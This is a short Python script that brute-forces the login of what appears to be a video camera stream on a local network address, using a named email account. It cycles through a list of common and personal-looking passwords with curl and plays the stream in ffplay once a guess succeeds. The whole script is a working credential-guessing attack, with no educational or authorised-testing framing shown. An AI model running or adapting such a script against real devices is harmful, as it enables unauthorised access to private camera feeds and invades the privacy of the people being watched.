

import subprocess
import base64

# Replace these with your actual password guesses
passwords = ["123456", "password", "123456789", "12345678", "12345", "1234567", "1234567890", "qwerty", "abc123", "111111", "123123", "admin", "letmein", "welcome", "monkey", "1234", "123", "password1", "123qwe", "123abc","Hassan1211","123aaa"]


# Base part of the command
base_command = 'curl -vv -k -u ouna444@gmail.com:{} "https://10.0.0.67:19443/https/stream/mixed?video=h264&audio=g711&resolution=hd&deviceId=801AE7BE556096AF55ACA35CCA79BE332145F4CB" --output - | ffplay -'

for password in passwords:
    # Encode the password in base64
    encoded_password = base64.b64encode(password.encode()).decode()

    # Construct the full command
    full_command = base_command.format(encoded_password)

    
        # Execute the command and capture the standard error output
    process = subprocess.Popen(full_command, shell=True, stderr=subprocess.PIPE, text=True)

        # Wait for the process to complete and read stderr
    stderr = process.communicate()[1]

        # Check if the specific error message is in the output
    if "Invalid data found when processing input" in stderr:
        print(f"Password '{password}' failed.")
    else:
        print(f"Password '{password}' succeeded. Stream is running.")
        break

    
# Wait for the subprocess to finish if the correct password was found
if process and process.poll() is None:
    print("Press Ctrl+C to stop the stream.")
    process.wait()
